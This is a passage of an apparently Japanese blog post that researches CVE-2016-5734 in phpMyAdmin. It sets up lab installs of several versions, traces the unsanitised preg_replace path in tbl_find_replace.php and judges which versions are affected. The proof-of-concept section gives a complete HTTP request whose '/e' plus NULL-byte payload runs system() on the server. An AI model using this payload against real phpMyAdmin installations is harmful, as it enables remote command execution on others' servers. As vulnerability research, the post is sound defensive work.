2       5       1       0.001031        295600
2       5       R                       TRUE
1       4       1       0.001054        295600
1       4       R                       1
1       6       0       0.001230        295872  <span class="o">{</span>main<span class="o">}</span>  1               /usr/local/apache2/htdocs/append.php    0       0
2       7       0       0.001242        295952  xdebug_stop_trace       0               /usr/local/apache2/htdocs/append.php    2       0
                        0.001246        296016
TRACE END   <span class="o">[</span>2016-07-15 01:33:37]
</code></pre>
</div>

<h3 id="phpmyadmin-401015">
<a id="phpmyadmin-401015のインストール" class="anchor" href="#phpmyadmin-401015%E3%81%AE%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB" aria-hidden="true"><span class="octicon octicon-link"></span></a>phpMyAdmin 4.0.10.15のインストール</h3>

<p>Apache, PHP, MySQLが揃ったので、phpMyAdminを導入します。</p>

<div class="language-bash highlighter-rouge">
<pre class="highlight"><code><span class="gp">$ </span>wget https://files.phpmyadmin.net/phpMyAdmin/4.0.10.15/phpMyAdmin-4.0.10.15-all-languages.tar.gz
<span class="gp">$ </span>tar zxvf phpMyAdmin-4.0.10.15-all-languages.tar.gz
<span class="gp">$ </span>sudo mkdir /usr/local/apache2/htdocs/phpmyadmin4.0 
<span class="gp">$ </span>sudo cp -r phpMyAdmin-4.0.10.15-all-languages/<span class="k">*</span> /usr/local/apache2/htdocs/phpmyadmin
<span class="gp">$ </span>sudo /usr/local/apache2/bin/apachectl start
</code></pre>
</div>

<p>あとはhttp://vlun.test/phpmyadmin4.0/にアクセスして、mysqlのrootアカウントでログインできました。</p>

<p><img src="/images/2016/07/13/phpmyadmin_login.png" alt="phpmyadmin_login"></p>

<p>検証のデータベースとテーブルも作成しておきます。</p>

<div class="language-sql highlighter-rouge">
<pre class="highlight"><code><span class="k">CREATE</span> <span class="k">DATABASE</span> <span class="n">vlun_test</span><span class="p">;</span>
<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">vlun_test</span><span class="p">.</span><span class="n">test</span><span class="p">(</span><span class="n">id</span> <span class="n">int</span><span class="p">,</span> <span class="n">msg</span> <span class="n">varchar</span><span class="p">(</span><span class="mi">20</span><span class="p">));</span>
<span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">vlun_test</span><span class="p">.</span><span class="n">test</span> <span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="n">msg</span><span class="p">)</span> <span class="k">values</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">'AAA'</span><span class="p">);</span>
<span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">vlun_test</span><span class="p">.</span><span class="n">test</span> <span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="n">msg</span><span class="p">)</span> <span class="k">values</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s1">'BBB'</span><span class="p">);</span>
<span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">vlun_test</span><span class="p">.</span><span class="n">test</span> <span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="n">msg</span><span class="p">)</span> <span class="k">values</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s1">'CCC'</span><span class="p">);</span>
</code></pre>
</div>

<p>以下のようなテーブルとレコードが作成されます。</p>

<div class="highlighter-rouge">
<pre class="highlight"><code>mysql&gt; select * from vlun_test.test;
+------+------+
| id   | msg  |
+------+------+
|    1 | AAA  |
|    2 | BBB  |
|    3 | CCC  |
+------+------+
3 rows in set (0.00 sec)
</code></pre>
</div>

<p>この調子でphpMyAdmin4.4系とphpMyAdmin4.6系もインストールしておくことにします。本当に検証したいのはphpMyAdmin4.0系ですが、4.0系の問題を別の始点から観察するために他にversionも見てみます。</p>

<h2 id="phpmyadmin44156">
<a id="phpmyadmin44156のインストール" class="anchor" href="#phpmyadmin44156%E3%81%AE%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB" aria-hidden="true"><span class="octicon octicon-link"></span></a>phpMyAdmin4.4.15.6のインストール</h2>

<div class="highlighter-rouge">
<pre class="highlight"><code>$ wget https://files.phpmyadmin.net/phpMyAdmin/4.4.15.6/phpMyAdmin-4.4.15.6-all-languages.tar.gz
$ tar zxvf phpMyAdmin-4.4.15.6-all-languages.tar.gz
$ sudo mkdir /usr/local/apache2/htdocs/phpmyadmin4.4
$ sudo cp -r phpMyAdmin-4.4.15.6-all-languages/* /usr/local/apache2/htdocs/phpmyadmin4.4/
</code></pre>
</div>

<h2 id="phpmyadmin462">
<a id="phpmyadmin462のインストール" class="anchor" href="#phpmyadmin462%E3%81%AE%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB" aria-hidden="true"><span class="octicon octicon-link"></span></a>phpMyAdmin4.6.2のインストール</h2>

<div class="highlighter-rouge">
<pre class="highlight"><code>wget https://files.phpmyadmin.net/phpMyAdmin/4.6.2/phpMyAdmin-4.6.2-all-languages.tar.gz
tar zxvf phpMyAdmin-4.6.2-all-languages.tar.gz
sudo mkdir /usr/local/apache2/htdocs/phpmyadmin4.6
sudo cp -r phpMyAdmin-4.6.2-all-languages/* /usr/local/apache2/htdocs/phpmyadmin4.6/
</code></pre>
</div>

<p>phpMyAdmin4.6.2はphp5.5+以上が必要なようで、NULL終端攻撃が使えるPHP5.4.6では動作しませんでした。</p>

<h2 id="snapshot">
<a id="snapshotの作成" class="anchor" href="#snapshot%E3%81%AE%E4%BD%9C%E6%88%90" aria-hidden="true"><span class="octicon octicon-link"></span></a>snapshotの作成</h2>

<p>この時点でのsnapshotをとっておくことにします。</p>

<div class="language-bash highlighter-rouge">
<pre class="highlight"><code><span class="gp">$ </span>vagrant snapshot take install_all_phpmyadmin
Taking snapshot install_all_phpmyadmin
0%...10%...20%...30%...40%...50%...60%...70%...80%...90%...100%
Snapshot taken. UUID: 47ef0bd2-1a59-4b94-82c5-b4ad718688c8
<span class="gp">$ </span>vagrant snapshot list
Listing snapshots <span class="k">for</span> <span class="s1">'default'</span>:
   Name: clean <span class="o">(</span>UUID: 6a00cc14-4d38-40a5-815e-218a7d557b12<span class="o">)</span>
      Name: phpmyadmin_4.0.10.15_on_php_5.4.6 <span class="o">(</span>UUID: 1148b139-fa09-4a61-b586-d20bc7c83ffc<span class="o">)</span>
         Name: install_all_phpmyadmin <span class="o">(</span>UUID: 47ef0bd2-1a59-4b94-82c5-b4ad718688c8<span class="o">)</span> <span class="k">*</span>
</code></pre>
</div>

<h2 id="phpmyadmin401015">
<a id="phpmyadmin401015に関わる技術的な調査" class="anchor" href="#phpmyadmin401015%E3%81%AB%E9%96%A2%E3%82%8F%E3%82%8B%E6%8A%80%E8%A1%93%E7%9A%84%E3%81%AA%E8%AA%BF%E6%9F%BB" aria-hidden="true"><span class="octicon octicon-link"></span></a>phpMyAdmin4.0.10.15に関わる技術的な調査</h2>

<p>phpMyAdmin4.0.10.15で修正されたコードは<a href="https://github.com/phpmyadmin/phpmyadmin/commit/351019c">351019c</a>です。<a href="http://php.net/manual/ja/function.preg-quote.php">preg_quote</a>にデリミタとして使用する文字を加えて、その文字もエスケープしています。
この処理はavailable_mime変数に対して処理を行っています。この変数はphpMyAdminの<a href="http://docs.phpmyadmin.net/ja/latest/transformations.html">変換機能</a>に関わるもののようです。よって変換機能を拡張機能でして、有効化しないとこの脆弱性は発現することはないと考えられます。この機能はデフォルトでは無効化されていますので、config.inc.phpで$cfg[‘Servers’][$i][‘column_info’] = ‘pma__column_info’;を有効化しないと変換機能は動作しません。</p>

<p>最初にこの変数は配列として宣言されます。</p>

<div class="language-php highlighter-rouge">
<pre class="highlight"><code>$available_mime = array();
$mime_map = array();
</code></pre>
</div>

<p>次にPMA_getMIME関数でmime_map変数の、PMA_getAvailableMIMEtypes関数でavailable_mime変数の値を作成しています。</p>

<div class="language-php highlighter-rouge">
<pre class="highlight"><code>if ($cfgRelation['mimework'] <span class="err">&amp;&amp;</span> $GLOBALS['cfg']['BrowseMIME']) { 
    $mime_map = PMA_getMIME($db, $table);                        
    $available_mime = PMA_getAvailableMIMEtypes();               
</code></pre>
</div>

<p>PMA_getMIME関数は以下のように定義されていますので、column_infoテーブルがないと動作しません。</p>

<div class="language-php highlighter-rouge">
<pre class="highlight"><code>/**                                                                           
 * Gets the mimetypes for all columns of a table                              
 *                                                                            
 * @param string $db     the name of the db to check for                      
 * @param string $table  the name of the table to check for                   
 * @param string $strict whether to include only results having a mimetype set
 *                                                                            
 * @access  public                                                            
 *                                                                            
 * @return array [field_name][field_key] = field_value                        
 */                                                                           
function PMA_getMIME($db, $table, $strict = false)                            
{                                                                             
    $cfgRelation = PMA_getRelationsParam();                                   
                                                                              
    if (! $cfgRelation['commwork']) {                                         
        return false;                                                         
    }                                                                         
                                                                              
    $com_qry  = '                                                        
         SELECT `column_name`,                                           
                `mimetype`,                                              
                `transformation`,                                        
                `transformation_options`                                 
         FROM ' . PMA_Util::backquote($cfgRelation['db']) . '.'          
        . PMA_Util::backquote($cfgRelation['column_info']) . '           
         WHERE `db_name`    = \'' . PMA_Util::sqlAddSlashes($db) . '\'   
           AND `table_name` = \'' . PMA_Util::sqlAddSlashes($table) . '\'
           AND ( `mimetype` != \'\'' . (!$strict ? '                     
              OR `transformation` != \'\'                                
              OR `transformation_options` != \'\'' : '') . ')';          
    $result = PMA_DBI_fetch_result(                                      
        $com_qry, 'column_name', null, $GLOBALS['controllink']           
    );                                                                   
                                                                         
    foreach ($result as $column =&gt; $values) {                            
        // replacements in mimetype and transformation                   
        $values = str_replace("jpeg", "JPEG", $values);                  
        $values = str_replace("png", "PNG", $values);                    
        $values = str_replace("octet-stream", "Octetstream", $values);   
                                                                         
        // convert mimetype to new format (f.e. Text_Plain, etc)         
        $delimiter_space = '- ';                                         
        $delimiter = "_";                                                
        $values['mimetype'] = str_replace(                               
            $delimiter_space,                                            
            $delimiter,                                                  
            ucwords(                                                     
                str_replace(                                             
                    $delimiter,                                          
                    $delimiter_space,                                    
                    $values['mimetype']                                  
                )                                                        
            )                                                            
        );                                                               
                                                                         
        // convert transformation to new format (class name)     
        // f.e. Text_Plain_Substring.class.php                   
        $values = str_replace("__", "_", $values);               
        $values = str_replace(".inc.php", ".class.php", $values);
                                                                 
        $values['transformation'] = str_replace(                 
            $delimiter_space,                                    
            $delimiter,                                          
            ucwords(                                             
                str_replace(                                     
                    $delimiter,                                  
                    $delimiter_space,                            
                    $values['transformation']                    
                )                                                
            )                                                    
        );                                                       
                                                                 
        $result[$column] = $values;                              
    }                                                            
                                                                 
    return $result;                                              
} // end of the 'PMA_getMIME()' function                         
</code></pre>
</div>

<p>私が検証すべきphpMyAdminはこの変換機能を有効化していませんでしたので、本脆弱性の影響はないと判断しましたが、技術的な興味のために変換機能を有効化してみます。</p>

<ul>
  <li>拡張機能に必要なテーブルの作成</li>
</ul>

<div class="highlighter-rouge">
<pre class="highlight"><code>mysql&gt; source /usr/local/apache2/htdocs/phpmyadmin4.0/examples/create_tables.sql
Query OK, 1 row affected (0.05 sec)

Database changed
Query OK, 0 rows affected (0.17 sec)
Query OK, 0 rows affected (0.03 sec)
Query OK, 0 rows affected (0.01 sec)
(snip)
Query OK, 0 rows affected (0.01 sec)
Query OK, 0 rows affected (0.01 sec)
Query OK, 0 rows affected (0.00 sec)

mysql&gt; GRANT ALL ON phpmyadmin.* TO pma@localhost IDENTIFIED BY "pmapass";
Query OK, 0 rows affected (0.10 sec)
</code></pre>
</div>

<ul>
  <li>config.inc.phpを編集して変換機能を含む拡張機能を有効化</li>
</ul>

<div class="highlighter-rouge">
<pre class="highlight"><code>/* User used to manipulate with storage */
$cfg['Servers'][$i]['controlhost'] = '';
$cfg['Servers'][$i]['controluser'] = 'pma';
$cfg['Servers'][$i]['controlpass'] = 'pmapass';
$cfg['Servers'][$i]['pmadb'] = 'phpmyadmin';
$cfg['Servers'][$i]['column_info'] = 'pma__column_info';
$cfg['Servers'][$i]['bookmarktable'] = 'pma__bookmark';
$cfg['Servers'][$i]['relation'] = 'pma__relation';
$cfg['Servers'][$i]['table_info'] = 'pma__table_info';
$cfg['Servers'][$i]['table_coords'] = 'pma__table_coords';
$cfg['Servers'][$i]['pdf_pages'] = 'pma__pdf_pages';
$cfg['Servers'][$i]['history'] = 'pma__history';
$cfg['Servers'][$i]['table_uiprefs'] = 'pma__table_uiprefs';
$cfg['Servers'][$i]['tracking'] = 'pma__tracking';
$cfg['Servers'][$i]['designer_coords'] = 'pma__designer_coords';
$cfg['Servers'][$i]['userconfig'] = 'pma__userconfig';
$cfg['Servers'][$i]['recent'] = 'pma__recent';
/* Contrib / Swekey authentication */
$cfg['Servers'][$i]['auth_swekey_config'] = '/etc/swekey-pma.conf';
</code></pre>
</div>

<p>変換機能はテーブルの構造タブから変更ボタンを押すことで利用することができます。</p>

<ul>
  <li>拡張機能設定前の状態</li>
</ul>

<p><img src="/images/2016/07/13/phpmyadmin_pre_extend.png" alt="phpmyadmin_login"></p>

<ul>
  <li>拡張機能設定後の状態</li>
</ul>

<p><img src="/images/2016/07/13/phpmyadmin_after_extend.png" alt="phpmyadmin_login"></p>

<p>MIMEタイプ、ブラウザ変換機能、変換オプションが増えているのがわかります。
ここに脆弱性があるとのことですが、確かに修正箇所のロジックを通るのはわかりますが、修正された正規表現はpreg_matchに与えられており、preg_replaceに入る箇所を見つけることができませんでした。
なので、実証検証が世にでるまでは私はCVE-2016-5734がphpMyAdminの4.0系で本当に任意のコマンドの実行ができるという発表には懐疑的です。</p>

<h3 id="phpmyadmin44156-1">
<a id="phpmyadmin44156に関わる技術的な調査" class="anchor" href="#phpmyadmin44156%E3%81%AB%E9%96%A2%E3%82%8F%E3%82%8B%E6%8A%80%E8%A1%93%E7%9A%84%E3%81%AA%E8%AA%BF%E6%9F%BB" aria-hidden="true"><span class="octicon octicon-link"></span></a>phpMyAdmin4.4.15.6に関わる技術的な調査</h3>

<p>phpMyAdmin4.4系に関わる修正コミットは<a href="https://github.com/phpmyadmin/phpmyadmin/commit/33d1373">33d1373</a>と<a href="https://github.com/phpmyadmin/phpmyadmin/commit/daf3751">daf3751</a>です。</p>

<div class="language-php highlighter-rouge">
<pre class="highlight"><code>    /**
     * Finds and returns Regex pattern and their replacements
     *
     * @param int    $columnIndex index of the column
     * @param string $find        string to find in the column
     * @param string $replaceWith string to replace with
     * @param string $charSet     character set of the connection
     *
     * @return array Array containing original values, replaced values and count
     */
    function _getRegexReplaceRows($columnIndex, $find, $replaceWith, $charSet)
    {
        $column = $this-&gt;_columnNames[$columnIndex];
        $sql_query = "SELECT "
            . PMA_Util::backquote($column) . ","
            . " 1," // to add an extra column that will have replaced value
            . " COUNT(*)"
            . " FROM " . PMA_Util::backquote($this-&gt;_db)
            . "." . PMA_Util::backquote($this-&gt;_table)
            . " WHERE " . PMA_Util::backquote($column)
            . " RLIKE '" . PMA_Util::sqlAddSlashes($find) . "' COLLATE "
            . $charSet . "_bin"; // here we
            // change the collation of the 2nd operand to a case sensitive
            // binary collation to make sure that the comparison is case sensitive
        $sql_query .= " GROUP BY " . PMA_Util::backquote($column)
            . " ORDER BY " . PMA_Util::backquote($column) . " ASC";

        $result = $GLOBALS['dbi']-&gt;fetchResult($sql_query, 0);

        if (is_array($result)) {
            foreach ($result as $index=&gt;$row) {
                $result[$index][1] = preg_replace(
                    "/" . $find . "/",
                    $replaceWith,
                    $row[0]
                );
            }
        }
        return $result;
    }
</code></pre>
</div>

<p>_getRegexReplaceRows関数を呼んでいるのははTableSearch.class.php自身です。</p>

<div class="highlighter-rouge">
<pre class="highlight"><code>kosuke@chaos ~/phpMyAdmin-4.4.15.6-all-languages $ grep -rn _getRegexReplaceRows *
libraries/TableSearch.class.php:1388:    function _getRegexReplaceRows($columnIndex, $find, $replaceWith, $charSet)
libraries/TableSearch.class.php:1435:            $result = $this-&gt;_getRegexReplaceRows(
libraries/TableSearch.class.php:1528:            $toReplace = $this-&gt;_getRegexReplaceRows(
</code></pre>
</div>

<p>getReplacePreview関数の中で_getRegexReplaceRow関数が呼ばれています。</p>

<div class="highlighter-rouge">
<pre class="highlight"><code>    /**
     * Returns HTML for previewing strings found and their replacements
     *
     * @param int     $columnIndex index of the column
     * @param string  $find        string to find in the column
     * @param string  $replaceWith string to replace with
     * @param boolean $useRegex    to use Regex replace or not
     * @param string  $charSet     character set of the connection
     *
     * @return string HTML for previewing strings found and their replacements
     */
    function getReplacePreview($columnIndex, $find, $replaceWith, $useRegex,
        $charSet
    ) {
        $column = $this-&gt;_columnNames[$columnIndex];
        if ($useRegex) {
            $result = $this-&gt;_getRegexReplaceRows(
                $columnIndex, $find, $replaceWith, $charSet
            );
        } else {
            $sql_query = "SELECT "
                . PMA_Util::backquote($column) . ","
                . " REPLACE("
                . PMA_Util::backquote($column) . ", '" . $find . "', '"
                . $replaceWith
                . "'),"
                . " COUNT(*)"
                . " FROM " . PMA_Util::backquote($this-&gt;_db)
                . "." . PMA_Util::backquote($this-&gt;_table)
                . " WHERE " . PMA_Util::backquote($column)
                . " LIKE '%" . $find . "%' COLLATE " . $charSet . "_bin"; // here we
                // change the collation of the 2nd operand to a case sensitive
                // binary collation to make sure that the comparison
                // is case sensitive
            $sql_query .= " GROUP BY " . PMA_Util::backquote($column)
                . " ORDER BY " . PMA_Util::backquote($column) . " ASC";

            $result = $GLOBALS['dbi']-&gt;fetchResult($sql_query, 0);
        }

        $htmlOutput = '&lt;form method="post" action="tbl_find_replace.php"'
            . ' name="previewForm" id="previewForm" class="ajax"&gt;';
        $htmlOutput .= PMA_URL_getHiddenInputs($this-&gt;_db, $this-&gt;_table);
        $htmlOutput .= '&lt;input type="hidden" name="replace" value="true" /&gt;';
        $htmlOutput .= '&lt;input type="hidden" name="columnIndex" value="'
            . $columnIndex . '" /&gt;';
        $htmlOutput .= '&lt;input type="hidden" name="findString"'
            . ' value="' . htmlspecialchars($find) . '" /&gt;';
        $htmlOutput .= '&lt;input type="hidden" name="replaceWith"'
            . ' value="' . htmlspecialchars($replaceWith) . '" /&gt;';
        $htmlOutput .= '&lt;input type="hidden" name="useRegex"'
            . ' value="' . $useRegex . '" /&gt;';

        $htmlOutput .= '&lt;fieldset id="fieldset_find_replace_preview"&gt;';
        $htmlOutput .= '&lt;legend&gt;' . __('Find and replace - preview') . '&lt;/legend&gt;';

        $htmlOutput .= '&lt;table id="previewTable"&gt;'
            . '&lt;thead&gt;&lt;tr&gt;'
            . '&lt;th&gt;' . __('Count') . '&lt;/th&gt;'
            . '&lt;th&gt;' . __('Original string') . '&lt;/th&gt;'
            . '&lt;th&gt;' . __('Replaced string') . '&lt;/th&gt;'
            . '&lt;/tr&gt;&lt;/thead&gt;';

        $htmlOutput .= '&lt;tbody&gt;';
        $odd = true;
        if (is_array($result)) {
            foreach ($result as $row) {
                $val = $row[0];
                $replaced = $row[1];
                $count = $row[2];

                $htmlOutput .= '&lt;tr class="' . ($odd ? 'odd' : 'even') . '"&gt;';
                $htmlOutput .= '&lt;td class="right"&gt;' . htmlspecialchars($count)
                    . '&lt;/td&gt;';
                $htmlOutput .= '&lt;td&gt;' . htmlspecialchars($val) . '&lt;/td&gt;';
                $htmlOutput .= '&lt;td&gt;' . htmlspecialchars($replaced) . '&lt;/td&gt;';
                $htmlOutput .= '&lt;/tr&gt;';

                $odd = ! $odd;
            }
        }
        $htmlOutput .= '&lt;/tbody&gt;';
        $htmlOutput .= '&lt;/table&gt;';
        $htmlOutput .= '&lt;/fieldset&gt;';

        $htmlOutput .= '&lt;fieldset class="tblFooters"&gt;';
        $htmlOutput .= '&lt;input type="submit" name="replace"'
            . ' value="' . __('Replace') . '" /&gt;';
        $htmlOutput .= '&lt;/fieldset&gt;';

        $htmlOutput .= '&lt;/form&gt;';
        return $htmlOutput;
    }
</code></pre>
</div>

<p>getReplacePreview関数を呼んでいるのはtbl_find_replace.phpです。</p>

<div class="highlighter-rouge">
<pre class="highlight"><code>kosuke@chaos ~/phpMyAdmin-4.4.15.6-all-languages $ grep -rn getReplacePreview *
libraries/TableSearch.class.php:1430:    function getReplacePreview($columnIndex, $find, $replaceWith, $useRegex,
tbl_find_replace.php:24:    $preview = $table_search-&gt;getReplacePreview(
</code></pre>
</div>

<p>驚くべきことにすべての値はPOSTから受け取っています。</p>

<div class="highlighter-rouge">
<pre class="highlight"><code>if (isset($_POST['find'])) {
    $preview = $table_search-&gt;getReplacePreview(
        $_POST['columnIndex'],
        $_POST['find'],
        $_POST['replaceWith'],
        $_POST['useRegex'],
        $connectionCharSet
    );
    $response-&gt;addJSON('preview', $preview);
    exit;
}
</code></pre>
</div>

<p>整理してみましょう。tbl_find_replace.phpが受け取るPOST値のcolumnIndex,find,
replaceWith,
useRegexはgetReplacePreview関数に渡されます。useRegex値が真だった場合、columnIndex,find,replaceWithの値は_getRegexReplaceRowsに渡され、置換対象テーブルにレコードがあった場合、以下のコードが実行されます。</p>

<div class="language-php highlighter-rouge">
<pre class="highlight"><code>                $result[$index][1] = preg_replace(
                    "/" . $find . "/",
                    $replaceWith,
                    $row[0]
                );
</code></pre>
</div>

<p>findの値、replaceWithの値は無害化されておらず、NULL終端攻撃を使えば任意のコマンドの実行が可能だと見受けられます。
調査したいところにデバッグ文を入れて、動作を確認します。</p>

<div class="highlighter-rouge">
<pre class="highlight"><code>                error_log("replaceWith = " . $replaceWith . "\n", "3","/tmp/debug.log");
                error_log("row[0] = " . $row[0] . "\n", "3","/tmp/debug.log");
                $result[$index][1] = preg_replace(
                    "/" . $find . "/",
                    $replaceWith,
                    $row[0]
                );
            }
        }
</code></pre>
</div>

<p>どうやら想定通りの挙動をしているようです。</p>

<h3 id="section-5">
<a id="概念実証" class="anchor" href="#%E6%A6%82%E5%BF%B5%E5%AE%9F%E8%A8%BC" aria-hidden="true"><span class="octicon octicon-link"></span></a>概念実証</h3>

<ul>
  <li>任意のデータベースを作成する</li>
  <li>任意のテーブルを作成する</li>
  <li>TEXT型のカラムを作成する</li>
  <li>作成したカラムに<code class="highlighter-rouge">.*/e</code>という値を挿入する</li>
  <li>Find and Replaceタブから以下のようなクエリを作成する</li>
</ul>

<div class="highlighter-rouge">
<pre class="highlight"><code>POST /phpmyadmin4.4/tbl_find_replace.php HTTP/1.1
Host: vlun.test
Content-Length: 298
Accept: */*
Origin: http://vlun.test
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://vlun.test/phpmyadmin4.4/db_central_columns.php
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.8,en;q=0.6
Cookie: pma_lang=ja; pma_collation_connection=utf8_unicode_ci; phpMyAdmin=h570mmbre13ohk3op3l5eoqkpi5r8c96; pma_iv-1=qfC3X1Rxqy%2BHM111U45i8A%3D%3D; pmaUser-1=Dpkv889nDY4H%2FGEo9zXw3w%3D%3D; pmaPass-1=EavpW0IpaWRAgGMgCEpTVg%3D%3D; pma_console_height=92; auto_saved_sql=SELECT%20*%20from%20test%20where%20NOT%20%3D%20'hoge'%3B; pma_console_config=%7B%22alwaysExpand%22%3Afalse%2C%22startHistory%22%3Afalse%2C%22currentQuery%22%3Atrue%7D; pma_console_mode=collapse
Connection: close

db=CVE-2016-5734&amp;table=CVE-2016-5734&amp;token=cc00761075dea256255cabd2b9e6a0b6&amp;goto=&amp;back=tbl_find_replace.php&amp;find=.*%2Fe%00&amp;replaceWith=system%28%27%2Fusr%2Fbin%2Ftouch+%2Ftmp%2FCVE-2016-5734%27%29%3B&amp;columnIndex=0&amp;useRegex=on&amp;submit=%E5%AE%9F%E8%A1%8C&amp;ajax_request=true&amp;_nocache=1468572249141822862
</code></pre>
</div>

<ul>
  <li>/tmp/CVE-2016-5734というファイルが作成されることを確認する</li>
</ul>

<h2 id="phpmyadmin462-1">
<a id="phpmyadmin462に関わる技術的な調査" class="anchor" href="#phpmyadmin462%E3%81%AB%E9%96%A2%E3%82%8F%E3%82%8B%E6%8A%80%E8%A1%93%E7%9A%84%E3%81%AA%E8%AA%BF%E6%9F%BB" aria-hidden="true"><span class="octicon octicon-link"></span></a>phpMyAdmin4.6.2に関わる技術的な調査</h2>

<p>phpMyAdmin4.6.2に関してはphp5.5上での動作しかできないため、NULL終端攻撃ができない。よって、CVE-2016-5734は発現しないと考える。</p>

<h1 id="section-6">
<a id="まとめ" class="anchor" href="#%E3%81%BE%E3%81%A8%E3%82%81" aria-hidden="true"><span class="octicon octicon-link"></span></a>まとめ</h1>

<p>CVE-2016-5734はPHP5.4.6以下の利用していた場合に、phpMyAdmin4.4系のみで発現する脆弱性だと思われる。</p>

<h1 id="section-7">
<a id="得られた知見" class="anchor" href="#%E5%BE%97%E3%82%89%E3%82%8C%E3%81%9F%E7%9F%A5%E8%A6%8B" aria-hidden="true"><span class="octicon octicon-link"></span></a>得られた知見</h1>

<ul>
  <li>PHPのPCRE関数は英数字、バックスラッシュ、空白文字以外の任意の文字を<a href="http://php.net/manual/ja/regexp.reference.delimiters.php">デリミタ</a>として使うことができる</li>
  <li>PHP5.4.6以下ではNULL終端攻撃を使用することができる。</li>
</ul>

<h1 id="section-8">
<a id="得られた疑問" class="anchor" href="#%E5%BE%97%E3%82%89%E3%82%8C%E3%81%9F%E7%96%91%E5%95%8F" aria-hidden="true"><span class="octicon octicon-link"></span></a>得られた疑問</h1>

<p>調査の結果、NVDとかなり異なる影響範囲になった。確かにNVDが対象とするソースには問題があるが、実際に攻撃可能かというと疑問がある。私の調査に不備があるのか、NVDの影響範囲の出し方の考え方が異なるのかが知りたい。</p>

<h1 id="section-9">
<a id="情報源" class="anchor" href="#%E6%83%85%E5%A0%B1%E6%BA%90" aria-hidden="true"><span class="octicon octicon-link"></span></a>情報源</h1>

<ul>
  <li><a href="https://www.kb.cert.org/vuls/byid?query=CVE-2016-5734&amp;searchview=">CERT</a></li>
  <li><a href="https://security-tracker.debian.org/tracker/CVE-2016-5734">Debian</a></li>
  <li><a href="https://github.com/search?q=%22CVE-2016-5734%22">Github</a></li>
  <li><a href="https://lwn.net/Search/DoSearch?words=CVE-2016-5734">LWN</a></li>
  <li><a href="https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-5734">NVD</a></li>
  <li><a href="https://packetstormsecurity.com/search/?q=CVE-2016-5734">PacketStorm</a></li>
  <li><a href="https://access.redhat.com/security/cve/CVE-2016-5734">Redhat</a></li>
  <li><a href="https://people.canonical.com/~ubuntu-security/cve/CVE-2016-5734.html">Ubuntu</a></li>
  <li><a href="https://marc.info/?s=CVE-2016-5734&amp;l=bugtraq">bugtraq</a></li>
  <li><a href="https://www.exploit-db.com/search/?action=search&amp;cve=2016-5734">exploitdb</a></li>
  <li><a href="https://marc.info/?s=CVE-2016-5734&amp;l=full-disclosure">fulldisc</a></li>
  <li><a href="https://www.rapid7.com/db/search?q=CVE-2016-5734">metasploit</a></li>
  <li><a href="https://marc.info/?s=CVE-2016-5734&amp;l=oss-security">oss-sec</a></li>
</ul>


  </div>

  <style type="text/css">
<!--
/*** sahre button settings ***/

/* adjusting twitter share button */
ul.share-buttons{
  margin : 0;
  list-style: none;
  padding: 0;
}

ul.share-buttons li{
  display: inline;
}

/* adjusting facebook share button */
.fb_iframe_widget > span {
  vertical-align: baseline !important;
}

/* adjusting google share button */
#___plusone_0{ width:72px !important; }
.___plusone_0 > span {
  vertical-align: baseline !important;
}

/* adjusting pocket share button */
.pocket-btn {
    display: inline;
}
-->
</style>

<!-- twitter share script -->
<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>

<!-- hatena share script -->
<script type="text/javascript" src="https://b.st-hatena.com/js/bookmark_button.js" charset="utf-8" async="async"></script>

<!-- facebook sahre script -->
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/ja_JP/sdk.js#xfbml=1&version=v2.6";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>

<!-- google sahre script -->
<script src="https://apis.google.com/js/platform.js" async defer>
ang: 'ja'}
</script>

<script type="text/javascript">!function(d,i){if(!d.getElementById(i)){var j=d.createElement("script");j.id=i;j.src="https://widgets.getpocket.com/v1/j/btn.js?v=1";var w=d.getElementById(i);d.body.appendChild(j);}}(document,"pocket-btn-js");</script>

<ul class="share-buttons" >
    <li>
        <!-- twitter share button -->
    <a href="https://twitter.com/share"
       class="twitter-share-button"
       data-url="https://kosukeshimofuji.jp/2016/07/19/CVE-2016-5734/"
       data-text="CVE-2016-5734 phpMyAdminに任意のコマンドの実行可能な脆弱性 | Kosuke Shimofuji's Home Page" >Tweet</a>
    </li>
    <li>
        <!-- facebook share button -->
        <div class="fb-share-button"
             data-href="https://kosukeshimofuji.jp/2016/07/19/CVE-2016-5734/"
             data-layout="button_count"></div>
    </li>
    <li>
        <!-- hatena share button -->
        <a href="http://b.hatena.ne.jp/entry/https://kosukeshimofuji.jp/2016/07/19/CVE-2016-5734/"
           class="hatena-bookmark-button"
           data-hatena-bookmark-layout="simple-balloon"
           data-hatena-bookmark-title="CVE-2016-5734 phpMyAdminに任意のコマンドの実行可能な脆弱性 | Kosuke Shimofuji's Home Page"
           data-hatena-bookmark-lang="ja"
           title="Share on Hatena">
            <img src="https://b.st-hatena.com/images/entry-button/button-only@2x.png"
                 alt="Share on Hatena" width="20" height="20" style="border: none;" />
